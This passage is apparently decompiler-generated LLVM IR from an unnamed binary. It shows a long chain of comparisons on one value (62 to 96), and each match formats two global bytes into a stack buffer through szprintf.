  %v3_b5dc = load i8, i8* @global_var_2c601.66, align 1
  %v3_b5e8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b5f4 = sext i8 %v3_b5dc to i32
  %v6_b5f4 = sext i8 %v3_b5e8 to i32
  %v8_b5f4 = call i32 @szprintf(i32 %v2_b5d0, i32 ptrtoint ([13 x i8]* @global_var_20124.189 to i32), i32 %v4_b5f4, i32 %v6_b5f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5c4, %dec_label_pc_b5d0
  %v7_b5fc = icmp eq i32 %v2_a93c, 62
  br i1 %v7_b5fc, label %dec_label_pc_b604, label %dec_label_pc_b62c

dec_label_pc_b604:                                ; preds = %dec_label_pc_b5f8
  %v2_b604 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b610 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b61c = load i8, i8* @global_var_2c602.67, align 1
  %v4_b628 = sext i8 %v3_b610 to i32
  %v6_b628 = sext i8 %v3_b61c to i32
  %v8_b628 = call i32 @szprintf(i32 %v2_b604, i32 ptrtoint ([13 x i8]* @global_var_20134.191 to i32), i32 %v4_b628, i32 %v6_b628, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b62c

dec_label_pc_b62c:                                ; preds = %dec_label_pc_b5f8, %dec_label_pc_b604
  %v7_b630 = icmp eq i32 %v2_a93c, 63
  br i1 %v7_b630, label %dec_label_pc_b638, label %dec_label_pc_b660

dec_label_pc_b638:                                ; preds = %dec_label_pc_b62c
  %v2_b638 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b644 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b650 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b65c = sext i8 %v3_b644 to i32
  %v6_b65c = sext i8 %v3_b650 to i32
  %v8_b65c = call i32 @szprintf(i32 %v2_b638, i32 ptrtoint ([13 x i8]* @global_var_20144.193 to i32), i32 %v4_b65c, i32 %v6_b65c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b660

dec_label_pc_b660:                                ; preds = %dec_label_pc_b62c, %dec_label_pc_b638
  %v7_b664 = icmp eq i32 %v2_a93c, 64
  br i1 %v7_b664, label %dec_label_pc_b66c, label %dec_label_pc_b694

dec_label_pc_b66c:                                ; preds = %dec_label_pc_b660
  %v2_b66c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b678 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b684 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b690 = sext i8 %v3_b678 to i32
  %v6_b690 = sext i8 %v3_b684 to i32
  %v8_b690 = call i32 @szprintf(i32 %v2_b66c, i32 ptrtoint ([13 x i8]* @global_var_20154.195 to i32), i32 %v4_b690, i32 %v6_b690, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b694

dec_label_pc_b694:                                ; preds = %dec_label_pc_b660, %dec_label_pc_b66c
  %v7_b698 = icmp eq i32 %v2_a93c, 65
  br i1 %v7_b698, label %dec_label_pc_b6a0, label %dec_label_pc_b6c8

dec_label_pc_b6a0:                                ; preds = %dec_label_pc_b694
  %v2_b6a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6ac = load i8, i8* @global_var_2c601.66, align 1
  %v3_b6b8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b6c4 = sext i8 %v3_b6ac to i32
  %v6_b6c4 = sext i8 %v3_b6b8 to i32
  %v8_b6c4 = call i32 @szprintf(i32 %v2_b6a0, i32 ptrtoint ([13 x i8]* @global_var_20164.197 to i32), i32 %v4_b6c4, i32 %v6_b6c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6c8

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b694, %dec_label_pc_b6a0
  %v7_b6cc = icmp eq i32 %v2_a93c, 66
  br i1 %v7_b6cc, label %dec_label_pc_b6d4, label %dec_label_pc_b6fc

dec_label_pc_b6d4:                                ; preds = %dec_label_pc_b6c8
  %v2_b6d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6e0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b6ec = load i8, i8* @global_var_2c602.67, align 1
  %v4_b6f8 = sext i8 %v3_b6e0 to i32
  %v6_b6f8 = sext i8 %v3_b6ec to i32
  %v8_b6f8 = call i32 @szprintf(i32 %v2_b6d4, i32 ptrtoint ([13 x i8]* @global_var_20174.199 to i32), i32 %v4_b6f8, i32 %v6_b6f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6c8, %dec_label_pc_b6d4
  %v7_b700 = icmp eq i32 %v2_a93c, 67
  br i1 %v7_b700, label %dec_label_pc_b708, label %dec_label_pc_b730

dec_label_pc_b708:                                ; preds = %dec_label_pc_b6fc
  %v2_b708 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b714 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b720 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b72c = sext i8 %v3_b714 to i32
  %v6_b72c = sext i8 %v3_b720 to i32
  %v8_b72c = call i32 @szprintf(i32 %v2_b708, i32 ptrtoint ([13 x i8]* @global_var_20184.201 to i32), i32 %v4_b72c, i32 %v6_b72c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b730

dec_label_pc_b730:                                ; preds = %dec_label_pc_b6fc, %dec_label_pc_b708
  %v7_b734 = icmp eq i32 %v2_a93c, 68
  br i1 %v7_b734, label %dec_label_pc_b73c, label %dec_label_pc_b764

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b730
  %v2_b73c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b748 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b754 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b760 = sext i8 %v3_b748 to i32
  %v6_b760 = sext i8 %v3_b754 to i32
  %v8_b760 = call i32 @szprintf(i32 %v2_b73c, i32 ptrtoint ([13 x i8]* @global_var_20194.203 to i32), i32 %v4_b760, i32 %v6_b760, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b764

dec_label_pc_b764:                                ; preds = %dec_label_pc_b730, %dec_label_pc_b73c
  %v7_b768 = icmp eq i32 %v2_a93c, 69
  br i1 %v7_b768, label %dec_label_pc_b770, label %dec_label_pc_b9e4

dec_label_pc_b770:                                ; preds = %dec_label_pc_b764
  %v2_b770 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b77c = load i8, i8* @global_var_2c601.66, align 1
  %v3_b788 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b794 = sext i8 %v3_b77c to i32
  %v6_b794 = sext i8 %v3_b788 to i32
  %v8_b794 = call i32 @szprintf(i32 %v2_b770, i32 ptrtoint ([13 x i8]* @global_var_201a4.205 to i32), i32 %v4_b794, i32 %v6_b794, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9e4

dec_label_pc_b9e4:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b770
  %v7_b9e8 = icmp eq i32 %v2_a93c, 70
  br i1 %v7_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_ba18

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9e4
  %v2_b9f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9fc = load i8, i8* @global_var_2c601.66, align 1
  %v3_ba08 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ba14 = sext i8 %v3_b9fc to i32
  %v6_ba14 = sext i8 %v3_ba08 to i32
  %v8_ba14 = call i32 @szprintf(i32 %v2_b9f0, i32 ptrtoint ([13 x i8]* @global_var_201b4.207 to i32), i32 %v4_ba14, i32 %v6_ba14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9e4, %dec_label_pc_b9f0
  %v7_ba1c = icmp eq i32 %v2_a93c, 71
  br i1 %v7_ba1c, label %dec_label_pc_ba24, label %dec_label_pc_ba4c

dec_label_pc_ba24:                                ; preds = %dec_label_pc_ba18
  %v2_ba24 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba30 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ba3c = load i8, i8* @global_var_2c602.67, align 1
  %v4_ba48 = sext i8 %v3_ba30 to i32
  %v6_ba48 = sext i8 %v3_ba3c to i32
  %v8_ba48 = call i32 @szprintf(i32 %v2_ba24, i32 ptrtoint ([13 x i8]* @global_var_201c4.210 to i32), i32 %v4_ba48, i32 %v6_ba48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba18, %dec_label_pc_ba24
  %v7_ba50 = icmp eq i32 %v2_a93c, 72
  br i1 %v7_ba50, label %dec_label_pc_ba58, label %dec_label_pc_ba80

dec_label_pc_ba58:                                ; preds = %dec_label_pc_ba4c
  %v2_ba58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba64 = load i8, i8* @global_var_2c601.66, align 1
  %v3_ba70 = load i8, i8* @global_var_2c602.67, align 1
  %v4_ba7c = sext i8 %v3_ba64 to i32
  %v6_ba7c = sext i8 %v3_ba70 to i32
  %v8_ba7c = call i32 @szprintf(i32 %v2_ba58, i32 ptrtoint ([13 x i8]* @global_var_201d4.212 to i32), i32 %v4_ba7c, i32 %v6_ba7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba80

dec_label_pc_ba80:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_ba58
  %v7_ba84 = icmp eq i32 %v2_a93c, 73
  br i1 %v7_ba84, label %dec_label_pc_ba8c, label %dec_label_pc_bab4

dec_label_pc_ba8c:                                ; preds = %dec_label_pc_ba80
  %v2_ba8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba98 = load i8, i8* @global_var_2c601.66, align 1
  %v3_baa4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bab0 = sext i8 %v3_ba98 to i32
  %v6_bab0 = sext i8 %v3_baa4 to i32
  %v8_bab0 = call i32 @szprintf(i32 %v2_ba8c, i32 ptrtoint ([13 x i8]* @global_var_201e4.214 to i32), i32 %v4_bab0, i32 %v6_bab0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bab4

dec_label_pc_bab4:                                ; preds = %dec_label_pc_ba80, %dec_label_pc_ba8c
  %v7_bab8 = icmp eq i32 %v2_a93c, 74
  br i1 %v7_bab8, label %dec_label_pc_bac0, label %dec_label_pc_bae8

dec_label_pc_bac0:                                ; preds = %dec_label_pc_bab4
  %v2_bac0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bacc = load i8, i8* @global_var_2c601.66, align 1
  %v3_bad8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bae4 = sext i8 %v3_bacc to i32
  %v6_bae4 = sext i8 %v3_bad8 to i32
  %v8_bae4 = call i32 @szprintf(i32 %v2_bac0, i32 ptrtoint ([13 x i8]* @global_var_201f4.216 to i32), i32 %v4_bae4, i32 %v6_bae4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %dec_label_pc_bab4, %dec_label_pc_bac0
  %v7_baec = icmp eq i32 %v2_a93c, 75
  br i1 %v7_baec, label %dec_label_pc_baf4, label %dec_label_pc_bb1c

dec_label_pc_baf4:                                ; preds = %dec_label_pc_bae8
  %v2_baf4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb00 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bb0c = load i8, i8* @global_var_2c602.67, align 1
  %v4_bb18 = sext i8 %v3_bb00 to i32
  %v6_bb18 = sext i8 %v3_bb0c to i32
  %v8_bb18 = call i32 @szprintf(i32 %v2_baf4, i32 ptrtoint ([13 x i8]* @global_var_20204.218 to i32), i32 %v4_bb18, i32 %v6_bb18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb1c

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bae8, %dec_label_pc_baf4
  %v7_bb20 = icmp eq i32 %v2_a93c, 76
  br i1 %v7_bb20, label %dec_label_pc_bb28, label %dec_label_pc_bb50

dec_label_pc_bb28:                                ; preds = %dec_label_pc_bb1c
  %v2_bb28 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb34 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bb40 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bb4c = sext i8 %v3_bb34 to i32
  %v6_bb4c = sext i8 %v3_bb40 to i32
  %v8_bb4c = call i32 @szprintf(i32 %v2_bb28, i32 ptrtoint ([13 x i8]* @global_var_20214.220 to i32), i32 %v4_bb4c, i32 %v6_bb4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb50

dec_label_pc_bb50:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb28
  %v7_bb54 = icmp eq i32 %v2_a93c, 77
  br i1 %v7_bb54, label %dec_label_pc_bb5c, label %dec_label_pc_bb84

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_bb50
  %v2_bb5c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb68 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bb74 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bb80 = sext i8 %v3_bb68 to i32
  %v6_bb80 = sext i8 %v3_bb74 to i32
  %v8_bb80 = call i32 @szprintf(i32 %v2_bb5c, i32 ptrtoint ([13 x i8]* @global_var_20224.222 to i32), i32 %v4_bb80, i32 %v6_bb80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb84

dec_label_pc_bb84:                                ; preds = %dec_label_pc_bb50, %dec_label_pc_bb5c
  %v7_bb88 = icmp eq i32 %v2_a93c, 78
  br i1 %v7_bb88, label %dec_label_pc_bb90, label %dec_label_pc_bbb8

dec_label_pc_bb90:                                ; preds = %dec_label_pc_bb84
  %v2_bb90 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb9c = load i8, i8* @global_var_2c601.66, align 1
  %v3_bba8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bbb4 = sext i8 %v3_bb9c to i32
  %v6_bbb4 = sext i8 %v3_bba8 to i32
  %v8_bbb4 = call i32 @szprintf(i32 %v2_bb90, i32 ptrtoint ([13 x i8]* @global_var_20234.224 to i32), i32 %v4_bbb4, i32 %v6_bbb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bb84, %dec_label_pc_bb90
  %v7_bbbc = icmp eq i32 %v2_a93c, 79
  br i1 %v7_bbbc, label %dec_label_pc_bbc4, label %dec_label_pc_bbec

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bbb8
  %v2_bbc4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bbd0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bbdc = load i8, i8* @global_var_2c602.67, align 1
  %v4_bbe8 = sext i8 %v3_bbd0 to i32
  %v6_bbe8 = sext i8 %v3_bbdc to i32
  %v8_bbe8 = call i32 @szprintf(i32 %v2_bbc4, i32 ptrtoint ([13 x i8]* @global_var_20244.226 to i32), i32 %v4_bbe8, i32 %v6_bbe8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbec

dec_label_pc_bbec:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_bbc4
  %v7_bbf0 = icmp eq i32 %v2_a93c, 80
  br i1 %v7_bbf0, label %dec_label_pc_bbf8, label %dec_label_pc_bc20

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bbec
  %v2_bbf8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc04 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bc10 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bc1c = sext i8 %v3_bc04 to i32
  %v6_bc1c = sext i8 %v3_bc10 to i32
  %v8_bc1c = call i32 @szprintf(i32 %v2_bbf8, i32 ptrtoint ([13 x i8]* @global_var_20254.228 to i32), i32 %v4_bc1c, i32 %v6_bc1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bbec, %dec_label_pc_bbf8
  %v7_bc24 = icmp eq i32 %v2_a93c, 81
  br i1 %v7_bc24, label %dec_label_pc_bc2c, label %dec_label_pc_bc54

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_bc20
  %v2_bc2c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc38 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bc44 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bc50 = sext i8 %v3_bc38 to i32
  %v6_bc50 = sext i8 %v3_bc44 to i32
  %v8_bc50 = call i32 @szprintf(i32 %v2_bc2c, i32 ptrtoint ([13 x i8]* @global_var_20264.230 to i32), i32 %v4_bc50, i32 %v6_bc50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc54

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc20, %dec_label_pc_bc2c
  %v7_bc58 = icmp eq i32 %v2_a93c, 82
  br i1 %v7_bc58, label %dec_label_pc_bc60, label %dec_label_pc_bc88

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bc54
  %v2_bc60 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc6c = load i8, i8* @global_var_2c601.66, align 1
  %v3_bc78 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bc84 = sext i8 %v3_bc6c to i32
  %v6_bc84 = sext i8 %v3_bc78 to i32
  %v8_bc84 = call i32 @szprintf(i32 %v2_bc60, i32 ptrtoint ([13 x i8]* @global_var_20274.232 to i32), i32 %v4_bc84, i32 %v6_bc84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc88

dec_label_pc_bc88:                                ; preds = %dec_label_pc_bc54, %dec_label_pc_bc60
  %v7_bc8c = icmp eq i32 %v2_a93c, 83
  br i1 %v7_bc8c, label %dec_label_pc_bc94, label %dec_label_pc_bcbc

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc88
  %v2_bc94 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bca0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bcac = load i8, i8* @global_var_2c602.67, align 1
  %v4_bcb8 = sext i8 %v3_bca0 to i32
  %v6_bcb8 = sext i8 %v3_bcac to i32
  %v8_bcb8 = call i32 @szprintf(i32 %v2_bc94, i32 ptrtoint ([13 x i8]* @global_var_20284.234 to i32), i32 %v4_bcb8, i32 %v6_bcb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcbc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bc88, %dec_label_pc_bc94
  %v7_bcc0 = icmp eq i32 %v2_a93c, 84
  br i1 %v7_bcc0, label %dec_label_pc_bcc8, label %dec_label_pc_bcf0

dec_label_pc_bcc8:                                ; preds = %dec_label_pc_bcbc
  %v2_bcc8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bcd4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bce0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bcec = sext i8 %v3_bcd4 to i32
  %v6_bcec = sext i8 %v3_bce0 to i32
  %v8_bcec = call i32 @szprintf(i32 %v2_bcc8, i32 ptrtoint ([13 x i8]* @global_var_20294.236 to i32), i32 %v4_bcec, i32 %v6_bcec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcf0

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcbc, %dec_label_pc_bcc8
  %v7_bcf4 = icmp eq i32 %v2_a93c, 85
  br i1 %v7_bcf4, label %dec_label_pc_bcfc, label %dec_label_pc_bd24

dec_label_pc_bcfc:                                ; preds = %dec_label_pc_bcf0
  %v2_bcfc = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd08 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bd14 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bd20 = sext i8 %v3_bd08 to i32
  %v6_bd20 = sext i8 %v3_bd14 to i32
  %v8_bd20 = call i32 @szprintf(i32 %v2_bcfc, i32 ptrtoint ([13 x i8]* @global_var_202a4.238 to i32), i32 %v4_bd20, i32 %v6_bd20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd24

dec_label_pc_bd24:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bcfc
  %v7_bd28 = icmp eq i32 %v2_a93c, 86
  br i1 %v7_bd28, label %dec_label_pc_bd30, label %dec_label_pc_bd58

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd24
  %v2_bd30 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd3c = load i8, i8* @global_var_2c601.66, align 1
  %v3_bd48 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bd54 = sext i8 %v3_bd3c to i32
  %v6_bd54 = sext i8 %v3_bd48 to i32
  %v8_bd54 = call i32 @szprintf(i32 %v2_bd30, i32 ptrtoint ([13 x i8]* @global_var_202b4.240 to i32), i32 %v4_bd54, i32 %v6_bd54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd58

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd24, %dec_label_pc_bd30
  %v7_bd5c = icmp eq i32 %v2_a93c, 87
  br i1 %v7_bd5c, label %dec_label_pc_bd64, label %dec_label_pc_bd8c

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd58
  %v2_bd64 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd70 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bd7c = load i8, i8* @global_var_2c602.67, align 1
  %v4_bd88 = sext i8 %v3_bd70 to i32
  %v6_bd88 = sext i8 %v3_bd7c to i32
  %v8_bd88 = call i32 @szprintf(i32 %v2_bd64, i32 ptrtoint ([13 x i8]* @global_var_202c4.242 to i32), i32 %v4_bd88, i32 %v6_bd88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd8c

dec_label_pc_bd8c:                                ; preds = %dec_label_pc_bd58, %dec_label_pc_bd64
  %v7_bd90 = icmp eq i32 %v2_a93c, 88
  br i1 %v7_bd90, label %dec_label_pc_bd98, label %dec_label_pc_bdc0

dec_label_pc_bd98:                                ; preds = %dec_label_pc_bd8c
  %v2_bd98 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bda4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bdb0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bdbc = sext i8 %v3_bda4 to i32
  %v6_bdbc = sext i8 %v3_bdb0 to i32
  %v8_bdbc = call i32 @szprintf(i32 %v2_bd98, i32 ptrtoint ([13 x i8]* @global_var_202d4.244 to i32), i32 %v4_bdbc, i32 %v6_bdbc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdc0

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd8c, %dec_label_pc_bd98
  %v7_bdc4 = icmp eq i32 %v2_a93c, 89
  br i1 %v7_bdc4, label %dec_label_pc_bdcc, label %dec_label_pc_bdf4

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bdc0
  %v2_bdcc = ptrtoint i32* %stack_var_-36 to i32
  %v3_bdd8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bde4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bdf0 = sext i8 %v3_bdd8 to i32
  %v6_bdf0 = sext i8 %v3_bde4 to i32
  %v8_bdf0 = call i32 @szprintf(i32 %v2_bdcc, i32 ptrtoint ([13 x i8]* @global_var_202e4.246 to i32), i32 %v4_bdf0, i32 %v6_bdf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdf4

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bdc0, %dec_label_pc_bdcc
  %v7_bdf8 = icmp eq i32 %v2_a93c, 90
  br i1 %v7_bdf8, label %dec_label_pc_be00, label %dec_label_pc_be28

dec_label_pc_be00:                                ; preds = %dec_label_pc_bdf4
  %v2_be00 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be0c = load i8, i8* @global_var_2c601.66, align 1
  %v3_be18 = load i8, i8* @global_var_2c602.67, align 1
  %v4_be24 = sext i8 %v3_be0c to i32
  %v6_be24 = sext i8 %v3_be18 to i32
  %v8_be24 = call i32 @szprintf(i32 %v2_be00, i32 ptrtoint ([13 x i8]* @global_var_202f4.248 to i32), i32 %v4_be24, i32 %v6_be24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be28

dec_label_pc_be28:                                ; preds = %dec_label_pc_bdf4, %dec_label_pc_be00
  %v7_be2c = icmp eq i32 %v2_a93c, 91
  br i1 %v7_be2c, label %dec_label_pc_be34, label %dec_label_pc_be5c

dec_label_pc_be34:                                ; preds = %dec_label_pc_be28
  %v2_be34 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be40 = load i8, i8* @global_var_2c601.66, align 1
  %v3_be4c = load i8, i8* @global_var_2c602.67, align 1
  %v4_be58 = sext i8 %v3_be40 to i32
  %v6_be58 = sext i8 %v3_be4c to i32
  %v8_be58 = call i32 @szprintf(i32 %v2_be34, i32 ptrtoint ([13 x i8]* @global_var_20304.250 to i32), i32 %v4_be58, i32 %v6_be58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be5c

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be28, %dec_label_pc_be34
  %v7_be60 = icmp eq i32 %v2_a93c, 92
  br i1 %v7_be60, label %dec_label_pc_be68, label %dec_label_pc_be90

dec_label_pc_be68:                                ; preds = %dec_label_pc_be5c
  %v2_be68 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be74 = load i8, i8* @global_var_2c601.66, align 1
  %v3_be80 = load i8, i8* @global_var_2c602.67, align 1
  %v4_be8c = sext i8 %v3_be74 to i32
  %v6_be8c = sext i8 %v3_be80 to i32
  %v8_be8c = call i32 @szprintf(i32 %v2_be68, i32 ptrtoint ([13 x i8]* @global_var_20314.252 to i32), i32 %v4_be8c, i32 %v6_be8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be90

dec_label_pc_be90:                                ; preds = %dec_label_pc_be5c, %dec_label_pc_be68
  %v7_be94 = icmp eq i32 %v2_a93c, 93
  br i1 %v7_be94, label %dec_label_pc_be9c, label %dec_label_pc_bec4

dec_label_pc_be9c:                                ; preds = %dec_label_pc_be90
  %v2_be9c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bea8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_beb4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bec0 = sext i8 %v3_bea8 to i32
  %v6_bec0 = sext i8 %v3_beb4 to i32
  %v8_bec0 = call i32 @szprintf(i32 %v2_be9c, i32 ptrtoint ([13 x i8]* @global_var_20324.254 to i32), i32 %v4_bec0, i32 %v6_bec0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bec4

dec_label_pc_bec4:                                ; preds = %dec_label_pc_be90, %dec_label_pc_be9c
  %v7_bec8 = icmp eq i32 %v2_a93c, 94
  br i1 %v7_bec8, label %dec_label_pc_bed0, label %dec_label_pc_bef8

dec_label_pc_bed0:                                ; preds = %dec_label_pc_bec4
  %v2_bed0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bedc = load i8, i8* @global_var_2c601.66, align 1
  %v3_bee8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bef4 = sext i8 %v3_bedc to i32
  %v6_bef4 = sext i8 %v3_bee8 to i32
  %v8_bef4 = call i32 @szprintf(i32 %v2_bed0, i32 ptrtoint ([13 x i8]* @global_var_20004.153 to i32), i32 %v4_bef4, i32 %v6_bef4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bef8

dec_label_pc_bef8:                                ; preds = %dec_label_pc_bec4, %dec_label_pc_bed0
  %v7_befc = icmp eq i32 %v2_a93c, 95
  br i1 %v7_befc, label %dec_label_pc_bf04, label %dec_label_pc_bf2c

dec_label_pc_bf04:                                ; preds = %dec_label_pc_bef8
  %v2_bf04 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf10 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bf1c = load i8, i8* @global_var_2c602.67, align 1
  %v4_bf28 = sext i8 %v3_bf10 to i32
  %v6_bf28 = sext i8 %v3_bf1c to i32
  %v8_bf28 = call i32 @szprintf(i32 %v2_bf04, i32 ptrtoint ([13 x i8]* @global_var_20334.256 to i32), i32 %v4_bf28, i32 %v6_bf28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_bef8, %dec_label_pc_bf04
  %v7_bf30 = icmp eq i32 %v2_a93c, 96
  br i1 %v7_bf30, label %dec_label_pc_bf38, label %dec_label_pc_bf60

dec_label_pc_bf38:                                ; preds = %dec_label_pc_bf2c
  %v2_bf38 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf44 = load i8, i8* @global_var_2c601.66, align 1
  %v3_bf50 = load i8, i8* @global_var_2c602.67, align 1
  %v4_bf5c = sext i8 %v3_bf44 to i32
  %v6_bf5c = sext i8 %v3_bf50 to i32
  %v8_bf5c = call i32 @szprintf(i32 %v2_bf38, i32 ptrtoint ([13 x i8]* @global_var_20034.159 to i32), i32 %v4_bf5c, i32 %v6_bf5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf60

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bf2c, %dec_label_pc_bf38
